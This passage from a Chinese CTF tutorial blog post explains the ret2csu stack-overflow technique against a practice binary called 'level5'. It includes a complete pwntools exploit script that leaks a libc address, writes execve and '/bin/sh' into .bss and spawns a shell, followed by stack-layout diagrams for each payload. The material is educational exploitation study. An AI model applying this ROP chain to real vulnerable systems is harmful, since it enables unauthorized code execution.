+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------</span><br><span class="line">|<span class="string">   寄存器    </span>|<span class="string">      存储数据       </span>|<span class="string"> </span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line">|<span class="string">    rbx     </span>|<span class="string">         0          </span>|<span class="string"> </span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line">|<span class="string">    rbp     </span>|<span class="string">         1          </span>|<span class="string"> </span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line">|<span class="string">    r12     </span>|<span class="string">     write_got      </span>|<span class="string"> </span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line">|<span class="string">    r13     </span>|<span class="string">         1          </span>|<span class="string"> </span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line">|<span class="string">    r14     </span>|<span class="string">     write_got      </span>|<span class="string"> </span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line">|<span class="string">    r15     </span>|<span class="string">         8          </span>|<span class="string"> </span></span><br><span class="line"><span class="string">-----------------------------------</span></span><br></pre></td></tr></table></figure>
+
+<p>那么payload的组合方式就是：</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'hollkdig'</span> * <span class="number">17</span>   <span class="attr">#0</span>x<span class="number">80</span><span class="number">+8</span>个字符</span><br><span class="line">			 += p<span class="number">64</span><span class="comment">(csu_behind_gadget)</span></span><br><span class="line">			 += p<span class="number">64</span><span class="comment">(0)</span> + p<span class="number">64</span><span class="comment">(0)</span> + p<span class="number">64</span><span class="comment">(1)</span> + p<span class="number">64</span><span class="comment">(write_got)</span> + p<span class="number">64</span><span class="comment">(1)</span> + p<span class="number">64</span><span class="comment">(write_got)</span> + p<span class="number">64</span><span class="comment">(8)</span></span><br><span class="line">			 += p<span class="number">64</span><span class="comment">(csu_front_gadget)</span></span><br><span class="line">			 += <span class="string">'hollkdig'</span> * <span class="number">7</span>    <span class="attr">#0</span>x<span class="number">38</span>个字符</span><br><span class="line">			 += mai<span class="symbol">n_addr</span></span><br></pre></td></tr></table></figure>
+
+<p>后面的read函数布局和调用execve函数与write函数的payload布局相同</p>
+<ul>
+<li>read函数阶段是将bss段地址作为参数，向bss段首地址写execve函数地址以及/bin/sh字符串<br>read函数结构：ssize_t read(int fd, void * buf, size_t count)</li>
+<li>调用execve函数阶段是将bss首地址（execve函数地址）和bss+8，即首地址的下8位地址（/bin/sh字符串）作为参数，只用到两个参数，所以只需要对r12和r13两个寄存器赋值，其他的寄存器都可以使用0占位</li>
+</ul>
+<h2 id="五、EXP"><a href="#五、EXP" class="headerlink" title="五、EXP"></a>五、EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">level5 = ELF(<span class="string">'./level5'</span>)</span><br><span class="line">sh = process(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line">write_got = level5.got[<span class="string">'write'</span>] 		<span class="comment">#获取write函数的got地址</span></span><br><span class="line">read_got = level5.got[<span class="string">'read'</span>]				<span class="comment">#获取read函数的got地址</span></span><br><span class="line">main_addr = level5.symbols[<span class="string">'main'</span>]  <span class="comment">#获取main函数的函数地址</span></span><br><span class="line">bss_base = level5.bss()							<span class="comment">#获取bss段地址</span></span><br><span class="line">csu_front_gadget = <span class="number">0x00000000004005F0</span> </span><br><span class="line"><span class="comment">#_libc_csu_init函数中位置靠前的gadget，即向rdi、rsi、rdx寄存器mov的gadget</span></span><br><span class="line">csu_behind_gadget = <span class="number">0x0000000000400606</span></span><br><span class="line"><span class="comment">#_libc_csu_init函数中位置靠后的gadget，即pop rbx、rbp、r12、r13、r14、r15寄存器的gadget</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#自定义csu函数，方便每一次构造payload</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(fill, rbx, rbp, r12, r13, r14, r15, main)</span>:</span></span><br><span class="line">  <span class="comment">#fill为填充sp指针偏移造成8字节空缺</span></span><br><span class="line">  <span class="comment">#rbx, rbp, r12, r13, r14, r15皆为pop参数</span></span><br><span class="line">  <span class="comment">#main为main函数地址</span></span><br><span class="line">    payload = <span class="string">'hollkdig'</span> * <span class="number">17</span> 			<span class="comment">#0x80+8个字节填满栈空间至ret返回指令</span></span><br><span class="line">    payload += p64(csu_behind_gadget) </span><br><span class="line">    payload += p64(fill) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_gadget)</span><br><span class="line">    payload += <span class="string">'hollkdig'</span> * <span class="number">7</span>      <span class="comment">#0x38个字节填充平衡堆栈造成的空缺</span></span><br><span class="line">    payload += p64(main)</span><br><span class="line">    sh.send(payload)    <span class="comment">#发送payload</span></span><br><span class="line">    sleep(<span class="number">1</span>)						<span class="comment">#暂停等待接收</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"><span class="comment">#write函数布局打印write函数地址并返回main函数</span></span><br><span class="line">csu(<span class="number">0</span>,<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">8</span>, main_addr)</span><br><span class="line"></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))    <span class="comment">#接收write函数地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)	<span class="comment">#LibcSearcher查找libc版本</span></span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>) <span class="comment">#计算该版本libc基地址</span></span><br><span class="line">execve_addr = libc_base + libc.dump(<span class="string">'execve'</span>) <span class="comment">#查找该版本libc execve函数地址</span></span><br><span class="line">log.success(<span class="string">'execve_addr '</span> + hex(execve_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"><span class="comment">#read函数布局，将execve函数地址和/bin/sh字符串写进bss段首地址</span></span><br><span class="line">csu(<span class="number">0</span>,<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_base, <span class="number">16</span>, main_addr)</span><br><span class="line">sh.send(p64(execve_addr) + <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"><span class="comment">#调用bss段中的execve('/bin/sh')</span></span><br><span class="line">csu(<span class="number">0</span>,<span class="number">0</span>, <span class="number">1</span>, bss_base, bss_base+<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、payload在栈中布局"><a href="#六、payload在栈中布局" class="headerlink" title="六、payload在栈中布局"></a>六、payload在栈中布局</h2><p>Payload1:</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">                			 +---------------------------+</span><br><span class="line">                      |          <span class="type">main_addr</span>        | <span class="type">覆盖behind_gadget</span>后的ret重新执行main</span><br><span class="line">                ------+---------------------------+</span><br><span class="line">                  ^   |          <span class="type">hollkdig</span>         | <span class="type">hollkdig</span>填充堆栈平衡造成的空缺</span><br><span class="line">                  |   <span class="type">+          hollkdig</span>         + hollkdig填充堆栈平衡造成的空缺</span><br><span class="line">                 <span class="number">0x38</span> |          <span class="type">........         | hollkdig</span>填充堆栈平衡造成的空缺</span><br><span class="line">                  |   <span class="type">+          hollkdig</span>         + hollkdig填充堆栈平衡造成的空缺</span><br><span class="line">                  v   |          <span class="type">hollkdig</span>         | <span class="type">hollkdig</span>填充堆栈平衡造成的空缺</span><br><span class="line">                ------+---------------------------+</span><br><span class="line">                      |      <span class="type">csu_front_gadgwt</span>     | <span class="type">覆盖原ret</span>返回位置，调用front_gadget</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |          <span class="type">00000008</span>         | <span class="type">放置在r15</span>中，作为write函数的count参数</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |         <span class="type">write_got</span>         | <span class="type">放置在r14</span>中，作为write函数的buf参数</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |          <span class="type">00000001</span>         | <span class="type">放置在r13</span>中，作为write函数的fd参数</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |         <span class="type">write_got</span>         | <span class="type">放置在r12</span>中，作为call的执行函数</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |          <span class="type">00000001</span>         | <span class="type">放置在rbp</span>中，使front_gadget后继续执行</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |          <span class="type">00000000</span>         | <span class="type">0</span>放置在rbx中，使得call write函数可行</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |          <span class="type">00000000</span>         | <span class="type">八个0</span>填充sp指针偏移造成的空缺</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |     <span class="type">csu_behind_gadget</span>     | <span class="type">覆盖原ret</span>返回位置，调用behind_gadget</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |         <span class="type">hollkdig</span>          | <span class="type">hollkdig</span>覆盖原saved ebp位置</span><br><span class="line">               ebp---&gt;+---------------------------+</span><br><span class="line">                      |         <span class="type">hollkdig</span>          | <span class="type">hollkdig</span>占位填满栈空间</span><br><span class="line">                      |         <span class="type">hollkdig</span>          | <span class="type">hollkdig</span>占位填满栈空间</span><br><span class="line">                      |         <span class="type">........          | hollkdig</span>占位填满栈空间</span><br><span class="line">                      |         <span class="type">hollkdig</span>          | <span class="type">hollkdig</span>占位填满栈空间</span><br><span class="line">                      |         <span class="type">hollkdig</span>          | <span class="type">hollkdig</span>占位填满栈空间</span><br><span class="line">                      |         <span class="type">hollkdig</span>          | <span class="type">hollkdig</span>占位填满栈空间</span><br><span class="line">buf终止位置,ebp<span class="number">-0x80</span>--&gt;+----------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>Payload2：</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">                			 +---------------------------+</span><br><span class="line">                      |          <span class="type">main_addr</span>        | <span class="type">覆盖behind_gadget</span>后的ret重新执行main</span><br><span class="line">                ------+---------------------------+</span><br><span class="line">                  ^   |          <span class="type">hollkdig</span>         | <span class="type">hollkdig</span>填充堆栈平衡造成的空缺</span><br><span class="line">                  |   <span class="type">+          hollkdig</span>         + hollkdig填充堆栈平衡造成的空缺</span><br><span class="line">                 <span class="number">0x38</span> |          <span class="type">........         | hollkdig</span>填充堆栈平衡造成的空缺</span><br><span class="line">                  |   <span class="type">+          hollkdig</span>         + hollkdig填充堆栈平衡造成的空缺</span><br><span class="line">                  v   |          <span class="type">hollkdig</span>         | <span class="type">hollkdig</span>填充堆栈平衡造成的空缺</span><br><span class="line">                ------+---------------------------+</span><br><span class="line">                      |      <span class="type">csu_front_gadgwt</span>     | <span class="type">覆盖原ret</span>返回位置，调用front_gadget</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |          <span class="type">00000008</span>         | <span class="type">放置在r15</span>中，作为read函数的count参数</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |          <span class="type">bss_addr</span>         | <span class="type">放置在r14</span>中，作为read函数的buf参数</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |          <span class="type">00000001</span>         | <span class="type">放置在r13</span>中，作为read函数的fd参数</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |          <span class="type">read_got</span>         | <span class="type">放置在r12</span>中，作为call的执行函数</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |          <span class="type">00000001</span>         | <span class="type">放置在rbp</span>中，使front_gadget后继续执行</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |          <span class="type">00000000</span>         | <span class="type">0</span>放置在rbx中，使得call read函数可行</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |          <span class="type">00000000</span>         | <span class="type">八个0</span>填充sp指针偏移造成的空缺</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |     <span class="type">csu_behind_gadget</span>     | <span class="type">覆盖原ret</span>返回位置，调用behind_gadget</span><br><span class="line">                      +---------------------------+</span><br><span class="line">                      |         <span class="type">hollkdig</span>          | <span class="type">hollkdig</span>覆盖原saved ebp位置</span><br><span class="line">               ebp---&gt;+---------------------------+</span><br><span class="line">                      |         <span class="type">hollkdig</span>          | <span class="type">hollkdig</span>占位填满栈空间</span><br><span class="line">                      |         <span class="type">hollkdig</span>          | <span class="type">hollkdig</span>占位填满栈空间</span><br><span class="line">                      |         <span class="type">........          | hollkdig</span>占位填满栈空间</span><br><span class="line">                      |         <span class="type">hollkdig</span>          | <span class="type">hollkdig</span>占位填满栈空间</span><br><span class="line">                      |         <span class="type">hollkdig</span>          | <span class="type">hollkdig</span>占位填满栈空间</span><br><span class="line">                      |         <span class="type">hollkdig</span>          | <span class="type">hollkdig</span>占位填满栈空间</span><br><span class="line">buf终止位置,ebp<span class="number">-0x80</span>--&gt;+----------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>Payload3：</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">                      +---------------------------+</span><br><span class="line">                      |<span class="string">          00000000         </span>|<span class="string"> 占位</span></span><br><span class="line"><span class="string">                      +---------------------------+</span></span><br><span class="line"><span class="string">                      </span>|<span class="string">          00000000         </span>|<span class="string"> 占位</span></span><br><span class="line"><span class="string">                      +---------------------------+</span></span><br><span class="line"><span class="string">                      </span>|<span class="string">         bss_addr+8        </span>|<span class="string"> /bin/sh放置在r13中，作为exe函数的参数</span></span><br><span class="line"><span class="string">                      +---------------------------+</span></span><br><span class="line"><span class="string">                      </span>|<span class="string">          bss_addr         </span>|<span class="string"> exe函数放置在r12中，作为call的执行函数</span></span><br><span class="line"><span class="string">                      +---------------------------+</span></span><br><span class="line"><span class="string">                      </span>|<span class="string">          00000001         </span>|<span class="string"> 占位</span></span><br><span class="line"><span class="string">                      +---------------------------+</span></span><br><span class="line"><span class="string">                      </span>|<span class="string">          00000000         </span>|<span class="string"> 占位</span></span><br><span class="line"><span class="string">                      +---------------------------+</span></span><br><span class="line"><span class="string">                      </span>|<span class="string">          00000000         </span>|<span class="string"> 八个0填充sp指针偏移造成的空缺</span></span><br><span class="line"><span class="string">                      +---------------------------+</span></span><br><span class="line"><span class="string">                      </span>|<span class="string">     csu_behind_gadget     </span>|<span class="string"> 覆盖原ret返回位置，调用behind_gadget</span></span><br><span class="line"><span class="string">                      +---------------------------+</span></span><br><span class="line"><span class="string">                      </span>|<span class="string">         hollkdig          </span>|<span class="string"> hollkdig覆盖原saved ebp位置</span></span><br><span class="line"><span class="string">               ebp---&gt;+---------------------------+</span></span><br><span class="line"><span class="string">                      </span>|<span class="string">         hollkdig          </span>|<span class="string"> hollkdig占位填满栈空间</span></span><br><span class="line"><span class="string">                      </span>|<span class="string">         hollkdig          </span>|<span class="string"> hollkdig占位填满栈空间</span></span><br><span class="line"><span class="string">                      </span>|<span class="string">         ........          </span>|<span class="string"> hollkdig占位填满栈空间</span></span><br><span class="line"><span class="string">                      </span>|<span class="string">         hollkdig          </span>|<span class="string"> hollkdig占位填满栈空间</span></span><br><span class="line"><span class="string">                      </span>|<span class="string">         hollkdig          </span>|<span class="string"> hollkdig占位填满栈空间</span></span><br><span class="line"><span class="string">                      </span>|<span class="string">         hollkdig          </span>|<span class="string"> hollkdig占位填满栈空间</span></span><br><span class="line"><span class="string">buf终止位置,ebp-0x80--&gt;+----------------------------+</span></span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>hollk</span>
+                    </p>
+                
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>一起努力，位列仙班</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/"># pwn,栈溢出</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/04/29/%E5%A5%BD%E5%A5%BD%E8%AF%B4%E8%AF%9D%E4%B9%8Bret2reg/">好好说话之ret2reg</a>
+            
+            
+            <a class="next" rel="next" href="/2020/04/29/%E5%A5%BD%E5%A5%BD%E8%AF%B4%E8%AF%9D%E4%B9%8Bret2libc3/">好好说话之ret2libc3</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© hollk | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
